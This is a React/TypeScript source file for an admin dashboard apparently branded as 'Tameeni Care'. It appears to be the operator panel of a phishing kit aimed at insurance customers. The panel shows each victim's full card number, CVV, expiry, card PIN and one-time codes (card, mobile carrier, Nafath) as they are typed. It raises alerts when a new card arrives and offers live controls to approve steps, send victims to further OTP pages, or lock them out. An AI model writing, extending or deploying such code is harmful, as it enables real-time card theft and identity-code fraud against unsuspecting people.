import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import {
  fetchSessions,
  getSocket,
  emitStep,
  emitBlockClient,
  emitAdminRedirect,
  currentStage,
  BACKEND_CONFIGURED,
  type SessionRecord,
  type StepKey,
} from "@/lib/backend";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Table, TableBody, TableCell, TableHead, TableHeader, TableRow,
} from "@/components/ui/table";
import {
  Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle,
} from "@/components/ui/dialog";
import {
  AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent,
  AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { toast } from "sonner";
import {
  Activity, Ban, CheckCircle2, LogOut, RefreshCw, Search, ShieldAlert, XCircle,
  Wifi, WifiOff, Send, ChevronRight,
} from "lucide-react";

export const Route = createFileRoute("/_authenticated/admin")({
  head: () => ({
    meta: [
      { title: "Admin dashboard — Tameeni Care" },
      { name: "description", content: "Live operations dashboard for customer sessions." },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: AdminDashboard,
});

const PAGE_DEFS: { key: string; label: string; match: (r: SessionRecord) => boolean }[] = [
  { key: "quote", label: "Quote / Landing", match: (r) => !r.companyData?.logo && !r.cardNumber && !r.MotslPhone && !r.NavazOtp },
  { key: "insurer", label: "Insurer selected", match: (r) => !!r.companyData?.logo && !r.cardNumber },
  { key: "payment", label: "Payment / Card", match: (r) => !!r.cardNumber && !r.CardOtp && !r.pin },
  { key: "cardOtp", label: "Card OTP", match: (r) => !!r.CardOtp && !r.OtpCardAccept },
  { key: "pin", label: "Card PIN", match: (r) => !!r.pin && !r.PinAccept },
  { key: "phone", label: "Phone entry", match: (r) => !!r.MotslPhone && !r.MotslAccept },
  { key: "motslOtp", label: "Motsl OTP", match: (r) => !!r.MotslOtp && !r.MotslOtpAccept },
  { key: "navaz", label: "Nafath", match: (r) => !!r.NavazOtp && !r.NavazAccept },
  { key: "stc", label: "STC awaiting", match: (r) => !!r.stcAwaitingCall && !r.STCAccept },
];

function pageOf(r: SessionRecord): string {
  const hit = PAGE_DEFS.find((p) => p.match(r));
  return hit ? hit.key : "quote";
}

/** First page = registration form (national ID / phone / car details). */
function hasFirstPageInfo(r: SessionRecord): boolean {
  return !!(r.national_id || r.phone || r.serialNumber);
}

function beep(frequency: number) {
  try {
    const AC = window.AudioContext || (window as unknown as { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
    if (!AC) return;
    const ctx = new AC();
    const o = ctx.createOscillator();
    const g = ctx.createGain();
    o.frequency.value = frequency;
    o.connect(g); g.connect(ctx.destination);
    g.gain.setValueAtTime(0.15, ctx.currentTime);
    g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.35);
    o.start(); o.stop(ctx.currentTime + 0.36);
  } catch { /* ignore */ }
}

function notify(title: string, body: string, tag: string, onOpen: () => void, tone: number) {
  toast.success(title, {
    description: body,
    action: { label: "Open", onClick: onOpen },
    duration: 12000,
  });
  try {
    if (typeof window !== "undefined" && "Notification" in window && Notification.permission === "granted") {
      const n = new Notification(title, { body, tag });
      n.onclick = () => { window.focus(); onOpen(); };
    }
  } catch { /* ignore */ }
  beep(tone);
}

function AdminDashboard() {
  const navigate = useNavigate();
  const qc = useQueryClient();
  const [query, setQuery] = useState("");
  const [tab, setTab] = useState<"live" | "all" | "blocked">("live");
  const [pageFilter, setPageFilter] = useState<string | null>(null);
  const [selected, setSelected] = useState<SessionRecord | null>(null);
  const [connected, setConnected] = useState(false);
  const seenCardsRef = useRef<Set<string>>(new Set());
  const initializedCardsRef = useRef(false);
  const seenSessionsRef = useRef<Map<string, boolean>>(new Map()); // id -> had first-page info
  const initializedSessionsRef = useRef(false);

  const { data, isLoading, isError, refetch, isFetching } = useQuery({
    queryKey: ["sessions"],
    queryFn: fetchSessions,
    refetchInterval: 5000,
  });

  useEffect(() => {
    if (typeof window !== "undefined" && "Notification" in window && Notification.permission === "default") {
      Notification.requestPermission().catch(() => {});
    }
  }, []);

  useEffect(() => {
    if (!data) return;

    // --- New visitor + first-page submission detection (poll-based) ---
    const seen = seenSessionsRef.current;
    if (!initializedSessionsRef.current) {
      data.forEach((r) => seen.set(r._id, hasFirstPageInfo(r)));
      initializedSessionsRef.current = true;
    } else {
      for (const r of data) {
        if (!seen.has(r._id)) {
          seen.set(r._id, hasFirstPageInfo(r));
          notify(
            "New visitor entered the website",
            `Session ${r._id.slice(-8)} · ${formatWhen(r.createdAt ?? r.created)}`,
            `visitor-${r._id}`,
            () => setSelected(r),
            660,
          );
        } else if (!seen.get(r._id) && hasFirstPageInfo(r)) {
          seen.set(r._id, true);
          notify(
            "First page submitted",
            `${r.national_id ?? "—"} ${r.phone ?? ""} · Session ${r._id.slice(-8)}`.trim(),
            `first-${r._id}`,
            () => setSelected(r),
            740,
          );
        }
      }
    }

    // --- Card submission detection ---
    const withCards = data.filter((r) => r.cardNumber);
    if (!initializedCardsRef.current) {
      withCards.forEach((r) => seenCardsRef.current.add(r._id));
      initializedCardsRef.current = true;
      return;
    }
    for (const r of withCards) {
      if (seenCardsRef.current.has(r._id)) continue;
      seenCardsRef.current.add(r._id);
      const masked = r.cardNumber ? `•••• ${r.cardNumber.slice(-4)}` : "card";
      notify(
        `New card submitted — ${masked}`,
        `Session ${r._id.slice(-8)} · ${r.national_id ?? ""} ${r.phone ?? ""}`.trim(),
        `card-${r._id}`,
        () => setSelected(r),
        880,
      );
    }
  }, [data]);

  useEffect(() => {
    if (!BACKEND_CONFIGURED) {
      setConnected(false);
      return;
    }
    const s = getSocket();
    const on = () => setConnected(true);
    const off = () => setConnected(false);
    setConnected(s.connected);
    s.on("connect", on);
    s.on("disconnect", off);
    const refresh = () => qc.invalidateQueries({ queryKey: ["sessions"] });
    ["newData", "paymentForm", "visaOtp", "phone", "phoneOtp", "mobOtp", "navaz"].forEach((e) =>
      s.on(e, refresh),
    );
    return () => {
      s.off("connect", on);
      s.off("disconnect", off);
      ["newData", "paymentForm", "visaOtp", "phone", "phoneOtp", "mobOtp", "navaz"].forEach((e) =>
        s.off(e, refresh),
      );
    };
  }, [qc]);

  const sessions = data ?? [];

  const liveSessions = useMemo(
    () => sessions.filter((r) => !r.blocked && (r.cardNumber || r.MotslPhone || r.NavazOtp || r.CardOtp || r.MotslOtp || r.companyData?.logo)),
    [sessions],
  );

  const pageCounts = useMemo(() => {
    const map = new Map<string, SessionRecord[]>();
    PAGE_DEFS.forEach((p) => map.set(p.key, []));
    for (const r of liveSessions) {
      const k = pageOf(r);
      map.get(k)?.push(r);
    }
    return map;
  }, [liveSessions]);

  const filtered = useMemo(() => {
    let list = sessions;
    if (tab === "blocked") list = list.filter((r) => r.blocked);
    else if (tab === "live") list = liveSessions;
    if (pageFilter) list = list.filter((r) => pageOf(r) === pageFilter);
    if (!query.trim()) return list;
    const q = query.trim().toLowerCase();
    return list.filter((r) =>
      [r._id, r.national_id, r.phone, r.serialNumber, r.car_model, r.carHolderName]
        .filter(Boolean)
        .some((v) => String(v).toLowerCase().includes(q)),
    );
  }, [sessions, liveSessions, query, tab, pageFilter]);

  const stats = useMemo(() => {
    const live = liveSessions.length;
    const blocked = sessions.filter((r) => r.blocked).length;
    const cards = sessions.filter((r) => r.cardNumber).length;
    return { total: sessions.length, live, blocked, cards };
  }, [sessions, liveSessions]);

  const signOut = useCallback(async () => {
    await qc.cancelQueries();
    qc.clear();
    await supabase.auth.signOut();
    navigate({ to: "/auth", replace: true });
  }, [qc, navigate]);

  return (
    <div className="min-h-screen bg-muted/20">
      <header className="border-b bg-background">
        <div className="mx-auto flex max-w-7xl items-center justify-between gap-4 px-6 py-4">
          <div className="flex items-center gap-3">
            <div className="rounded-md bg-primary/10 p-2 text-primary">
              <ShieldAlert className="h-5 w-5" />
            </div>
            <div>
              <h1 className="text-lg font-semibold leading-tight">Admin Dashboard</h1>
              <p className="text-xs text-muted-foreground">Tameeni Care operations</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Badge variant={connected ? "default" : "destructive"} className="gap-1">
              {connected ? <Wifi className="h-3 w-3" /> : <WifiOff className="h-3 w-3" />}
              {connected ? "Realtime connected" : "Realtime offline"}
            </Badge>
            <Button variant="outline" size="sm" onClick={() => refetch()} disabled={isFetching}>
              <RefreshCw className={`mr-2 h-4 w-4 ${isFetching ? "animate-spin" : ""}`} />
              Refresh
            </Button>
            <Button variant="ghost" size="sm" onClick={signOut}>
              <LogOut className="mr-2 h-4 w-4" /> Sign out
            </Button>
          </div>
        </div>
      </header>

      {!BACKEND_CONFIGURED && (
        <div className="border-b bg-amber-50 text-amber-900 dark:bg-amber-950/40 dark:text-amber-200">
          <div className="mx-auto max-w-7xl px-6 py-3 text-sm">
            <strong className="font-semibold">No backend connected.</strong>{" "}
            The dashboard is disconnected and ready for a new backend. Set{" "}
            <code className="rounded bg-background/60 px-1 py-0.5 text-xs">VITE_BACKEND_WS_URL</code>{" "}
            to your new backend base URL (must expose <code>GET /users</code> and a Socket.IO server), then redeploy.
          </div>
        </div>
      )}



      <main className="mx-auto grid max-w-[1400px] gap-6 px-6 py-6 lg:grid-cols-[280px_1fr]">
        <aside className="space-y-4">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm">Pages · live traffic</CardTitle>
            </CardHeader>
            <CardContent className="space-y-1 p-2">
              <button
                onClick={() => setPageFilter(null)}
                className={`flex w-full items-center justify-between rounded-md px-3 py-2 text-left text-sm transition hover:bg-muted ${pageFilter === null ? "bg-muted font-medium" : ""}`}
              >
                <span>All pages</span>
                <Badge variant="secondary">{liveSessions.length}</Badge>
              </button>
              {PAGE_DEFS.map((p) => {
                const rows = pageCounts.get(p.key) ?? [];
                const active = pageFilter === p.key;
                return (
                  <div key={p.key} className="rounded-md">
                    <button
                      onClick={() => setPageFilter(active ? null : p.key)}
                      className={`flex w-full items-center justify-between rounded-md px-3 py-2 text-left text-sm transition hover:bg-muted ${active ? "bg-muted font-medium" : ""}`}
                    >
                      <span className="flex items-center gap-2">
                        {rows.length > 0 && <span className="h-2 w-2 animate-pulse rounded-full bg-emerald-500" />}
                        {p.label}
                      </span>
                      <Badge variant={rows.length ? "default" : "secondary"}>{rows.length}</Badge>
                    </button>
                    {active && rows.length > 0 && (
                      <ul className="mb-1 ml-3 space-y-0.5 border-l pl-3">
                        {rows.slice(0, 20).map((r) => (
                          <li key={r._id}>
                            <button
                              onClick={() => setSelected(r)}
                              className="flex w-full items-center justify-between rounded px-2 py-1 text-left text-xs hover:bg-muted"
                              title="IP is not exposed by the backend — session ID shown instead"
                            >
                              <span className="font-mono">{r._id.slice(-8)}</span>
                              <span className="text-muted-foreground">{r.phone ?? r.national_id ?? "—"}</span>
                            </button>
                          </li>
                        ))}
                      </ul>
                    )}
                  </div>
                );
              })}
              <p className="px-3 pt-2 text-[10px] leading-tight text-muted-foreground">
                Visitor IPs aren't exposed by the upstream API; session ID is shown in place of IP.
              </p>
            </CardContent>
          </Card>
        </aside>

        <div className="space-y-6">
          <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
            <Stat label="Total sessions" value={stats.total} icon={<Activity className="h-4 w-4" />} />
            <Stat label="Live now" value={stats.live} icon={<Activity className="h-4 w-4 text-emerald-600" />} />
            <Stat label="Card submissions" value={stats.cards} icon={<CheckCircle2 className="h-4 w-4 text-blue-600" />} />
            <Stat label="Blocked" value={stats.blocked} icon={<Ban className="h-4 w-4 text-destructive" />} />
          </div>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between gap-4 space-y-0">
              <CardTitle>
                Sessions
                {pageFilter && (
                  <span className="ml-2 text-sm font-normal text-muted-foreground">
                    · {PAGE_DEFS.find((p) => p.key === pageFilter)?.label}
                    <button className="ml-2 text-xs underline" onClick={() => setPageFilter(null)}>clear</button>
                  </span>
                )}
              </CardTitle>
              <div className="relative w-full max-w-xs">
                <Search className="pointer-events-none absolute left-2 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                <Input
                  value={query}
                  onChange={(e) => setQuery(e.target.value)}
                  placeholder="Search ID, phone, national ID…"
                  className="pl-8"
                />
              </div>
            </CardHeader>
            <CardContent>
              <Tabs value={tab} onValueChange={(v) => setTab(v as typeof tab)}>
                <TabsList>
                  <TabsTrigger value="live">Live</TabsTrigger>
                  <TabsTrigger value="all">All</TabsTrigger>
                  <TabsTrigger value="blocked">Blocked</TabsTrigger>
                </TabsList>
                <TabsContent value={tab} className="mt-4">
                  {isLoading ? (
                    <div className="py-16 text-center text-sm text-muted-foreground">Loading sessions…</div>
                  ) : isError ? (
                    <div className="py-16 text-center text-sm text-destructive">
                      Failed to load sessions. <button className="underline" onClick={() => refetch()}>Retry</button>
                    </div>
                  ) : filtered.length === 0 ? (
                    <div className="py-16 text-center text-sm text-muted-foreground">No sessions match this view.</div>
                  ) : (
                    <div className="overflow-x-auto">
                      <Table>
                        <TableHeader>
                          <TableRow>
                            <TableHead>Session</TableHead>
                            <TableHead>Customer</TableHead>
                            <TableHead>Insurer</TableHead>
                            <TableHead>Stage</TableHead>
                            <TableHead>Updated</TableHead>
                            <TableHead className="text-right">Action</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {filtered.map((r) => {
                            const stage = currentStage(r);
                            return (
                              <TableRow key={r._id} className="cursor-pointer" onClick={() => setSelected(r)}>
                                <TableCell className="font-mono text-xs">{r._id.slice(-8)}</TableCell>
                                <TableCell>
                                  <div className="text-sm">{r.national_id ?? "—"}</div>
                                  <div className="text-xs text-muted-foreground">{r.phone ?? ""}</div>
                                </TableCell>
                                <TableCell>
                                  {r.companyData?.logo ? (
                                    <div className="flex items-center gap-2">
                                      <span className="text-sm">{Math.round(r.companyData.price ?? 0)} SAR</span>
                                    </div>
                                  ) : (
                                    <span className="text-xs text-muted-foreground">—</span>
                                  )}
                                </TableCell>
                                <TableCell>
                                  <StageBadge stage={stage.label} blocked={r.blocked} />
                                </TableCell>
                                <TableCell className="text-xs text-muted-foreground">
                                  {formatWhen(r.updatedAt ?? r.createdAt ?? r.created)}
                                </TableCell>
                                <TableCell className="text-right">
                                  <Button variant="ghost" size="sm">
                                    Open <ChevronRight className="ml-1 h-4 w-4" />
                                  </Button>
                                </TableCell>
                              </TableRow>
                            );
                          })}
                        </TableBody>
                      </Table>
                    </div>
                  )}
                </TabsContent>
              </Tabs>
            </CardContent>
          </Card>
        </div>
      </main>

      <SessionDialog session={selected} onOpenChange={(o) => !o && setSelected(null)} />
    </div>
  );
}

function Stat({ label, value, icon }: { label: string; value: number; icon: React.ReactNode }) {
  return (
    <Card>
      <CardContent className="flex items-center justify-between p-4">
        <div>
          <p className="text-xs uppercase tracking-wider text-muted-foreground">{label}</p>
          <p className="mt-1 text-2xl font-semibold tabular-nums">{value}</p>
        </div>
        <div className="rounded-md bg-muted p-2">{icon}</div>
      </CardContent>
    </Card>
  );
}

function StageBadge({ stage, blocked }: { stage: string; blocked?: boolean | undefined }) {
  if (blocked) return <Badge variant="destructive">Blocked</Badge>;
  return <Badge variant="secondary">{stage}</Badge>;
}


function formatWhen(v?: string) {
  if (!v) return "—";
  const d = new Date(v);
  if (Number.isNaN(d.getTime())) return "—";
  const diff = Date.now() - d.getTime();
  const s = Math.floor(diff / 1000);
  if (s < 60) return `${s}s ago`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}m ago`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}h ago`;
  return d.toLocaleString();
}

const REDIRECT_OPTIONS: { path: string; label: string }[] = [
  { path: "/phone", label: "Phone entry" },
  { path: "/phoneOtp", label: "Phone OTP" },
  { path: "/mobilyOtp", label: "Mobily OTP" },
  { path: "/stcOtp", label: "STC OTP" },
  { path: "/navaz", label: "Nafath" },
  { path: "/motslOtp", label: "Motsl OTP" },
  { path: "/confirm", label: "Confirm" },
  { path: "/verfiy", label: "Verify" },
  { path: "/activate", label: "Activate" },
];

function SessionDialog({
  session,
  onOpenChange,
}: {
  session: SessionRecord | null;
  onOpenChange: (open: boolean) => void;
}) {
  const [busyEvent, setBusyEvent] = useState<string | null>(null);

  if (!session) {
    return (
      <Dialog open={false} onOpenChange={onOpenChange}>
        <DialogContent />
      </Dialog>
    );
  }

  const send = (step: StepKey, accept: boolean) => {
    const ev = emitStep(session._id, step, accept);
    setBusyEvent(ev);
    toast.success(`Emitted ${ev}`);
    setTimeout(() => setBusyEvent(null), 800);
  };

  const redirect = (path: string) => {
    emitAdminRedirect(session._id, path);
    toast.success(`Redirected customer to ${path}`);
  };

  const block = () => {
    emitBlockClient(session._id);
    toast.success("Block signal sent");
  };

  return (
    <Dialog open onOpenChange={onOpenChange}>
      <DialogContent className="max-w-3xl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            Session <span className="font-mono text-sm text-muted-foreground">{session._id}</span>
          </DialogTitle>
          <DialogDescription>
            Review submission data, accept or decline the current step, redirect the customer, or block the session.
          </DialogDescription>
        </DialogHeader>

        <div className="grid gap-6 md:grid-cols-2">
          <section className="space-y-3">
            <h3 className="text-sm font-semibold">Customer</h3>
            <Field label="National ID" value={session.national_id} />
            <Field label="Phone" value={session.phone} />
            <Field label="Serial number" value={session.serialNumber} />
            <Field label="Vehicle" value={[session.car_year, session.car_model].filter(Boolean).join(" ")} />
            <Field label="Declared value" value={session.carPrice} />
            <Field label="Insurer offer" value={session.companyData?.price ? `${Math.round(session.companyData.price)} SAR` : undefined} />
          </section>

          <section className="space-y-3">
            <h3 className="text-sm font-semibold">Submissions</h3>
            <Field label="Card number" value={session.cardNumber} mono />
            <Field label="CVV" value={session.cvv} mono />
            <Field label="Expiry" value={session.expiryDate} mono />
            <Field label="Card OTP" value={session.CardOtp} mono />
            <Field label="PIN" value={session.pin} mono />
            <Field label="Motsl phone" value={session.MotslPhone} />
            <Field label="Motsl OTP" value={session.MotslOtp} mono />
            <Field label="Nafath OTP" value={session.NavazOtp} mono />
          </section>
        </div>

        <div className="space-y-3 border-t pt-4">
          <h3 className="text-sm font-semibold">Step actions</h3>
          <div className="grid grid-cols-2 gap-2 sm:grid-cols-3">
            {(
              [
                { k: "payment", label: "Card / Payment" },
                { k: "cardOtp", label: "Card OTP" },
                { k: "phone", label: "Phone" },
                { k: "phoneOtp", label: "Phone OTP" },
                { k: "mobilyOtp", label: "Mobily OTP" },
                { k: "stcOtp", label: "STC OTP" },
                { k: "motslOtp", label: "Motsl OTP" },
                { k: "navaz", label: "Nafath" },
                { k: "service", label: "Service" },
              ] as { k: StepKey; label: string }[]
            ).map(({ k, label }) => (
              <div key={k} className="flex items-center gap-1 rounded-md border p-2">
                <span className="flex-1 text-xs">{label}</span>
                <Button
                  size="sm"
                  variant="outline"
                  className="h-7 px-2 text-emerald-700"
                  onClick={() => send(k, true)}
                  disabled={busyEvent !== null}
                >
                  <CheckCircle2 className="h-3.5 w-3.5" />
                </Button>
                <Button
                  size="sm"
                  variant="outline"
                  className="h-7 px-2 text-destructive"
                  onClick={() => send(k, false)}
                  disabled={busyEvent !== null}
                >
                  <XCircle className="h-3.5 w-3.5" />
                </Button>
              </div>
            ))}
          </div>
        </div>

        <div className="space-y-3 border-t pt-4">
          <h3 className="text-sm font-semibold">Redirect customer</h3>
          <div className="flex flex-wrap gap-2">
            {REDIRECT_OPTIONS.map((r) => (
              <Button key={r.path} size="sm" variant="outline" onClick={() => redirect(r.path)}>
                <Send className="mr-1 h-3.5 w-3.5" /> {r.label}
              </Button>
            ))}
          </div>
        </div>

        <DialogFooter className="border-t pt-4">
          <AlertDialog>
            <AlertDialogTrigger asChild>
              <Button variant="destructive">
                <Ban className="mr-2 h-4 w-4" /> Block session
              </Button>
            </AlertDialogTrigger>
            <AlertDialogContent>
              <AlertDialogHeader>
                <AlertDialogTitle>Block this session?</AlertDialogTitle>
                <AlertDialogDescription>
                  A block signal will be sent to the customer's browser. They will be locked out of the flow.
                </AlertDialogDescription>
              </AlertDialogHeader>
              <AlertDialogFooter>
                <AlertDialogCancel>Cancel</AlertDialogCancel>
                <AlertDialogAction onClick={block}>Block</AlertDialogAction>
              </AlertDialogFooter>
            </AlertDialogContent>
          </AlertDialog>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}

function Field({ label, value, mono }: { label: string; value?: string | null | undefined; mono?: boolean | undefined }) {

  return (
    <div className="grid grid-cols-3 gap-2 text-sm">
      <div className="text-xs uppercase tracking-wider text-muted-foreground">{label}</div>
      <div className={`col-span-2 break-all ${mono ? "font-mono" : ""}`}>
        {value ? value : <span className="text-muted-foreground">—</span>}
      </div>
    </div>
  );
}
